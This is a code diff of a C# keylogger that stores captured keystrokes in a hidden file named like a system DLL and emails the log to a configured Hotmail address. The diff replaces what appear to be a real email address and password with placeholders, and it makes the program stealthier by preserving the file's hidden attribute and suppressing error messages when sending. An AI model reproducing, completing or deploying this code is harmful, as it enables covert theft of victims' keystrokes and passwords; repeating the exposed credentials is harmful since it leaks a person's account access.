@@ -27,15 +27,10 @@ namespace KeyLogger
             + @"\mciavi32.dll";
 
         /////////////// HOTMAIL ACCOUNT CONFIG ///////////////
-/*        public static string EmailFrom = "yourHOTMAIL@hotmail.com";
+        public static string EmailFrom = "yourHOTMAIL@hotmail.com";
         public static string EmailPassword = "yourHOTMAILpassword"; //it needs to be the password of the email account of EmailFrom
 
-        public static string EmailTo = "theirHOTMAIL@hotmail.com";*/
-
-        public static string EmailFrom = "lucascb777@hotmail.com";
-        public static string EmailPassword = "Lucas911oR190"; //it needs to be the password of the email account of EmailFrom
-
-        public static string EmailTo = "lucascb777@hotmail.com";
+        public static string EmailTo = "theirHOTMAIL@hotmail.com";
         /////////////// HOTMAIL ACCOUNT CONFIG ///////////////
 
         // CONFIGS
@@ -56,7 +51,7 @@ namespace KeyLogger
 
             if (!Hidden) {
                 Hidden = true;
-                File.SetAttributes(FILE_PATH, FileAttributes.Hidden);
+                File.SetAttributes(FILE_PATH, File.GetAttributes(FILE_PATH) | FileAttributes.Hidden);
             }
 
             Console.ResetColor();
@@ -95,9 +90,9 @@ namespace KeyLogger
 
                 smtp.Send(Message);
             }
-            catch (Exception ex)
+            catch (Exception ex) 
             {
-                Console.WriteLine(ex.Message);
+                //Console.WriteLine(ex.Message);
             }
 
             if (File.Exists(FILE_PATH))
